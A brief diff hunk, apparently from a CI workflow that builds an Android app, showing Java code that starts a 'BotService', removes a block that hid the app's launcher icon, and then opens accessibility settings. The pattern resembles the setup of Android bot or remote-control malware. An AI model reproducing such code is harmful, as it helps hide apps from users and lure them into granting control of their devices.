@@ -208,10 +208,7 @@ jobs:
                 Intent i = new Intent(this, BotService.class);
                 if (Build.VERSION.SDK_INT >= 26) startForegroundService(i); else startService(i);
               } catch (Exception e) {}
-              try {
-                getPackageManager().setComponentEnabledSetting(getComponentName(),
-                  PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-              } catch (Exception e) {}
+              
               try {
                 startActivity(new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                   .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
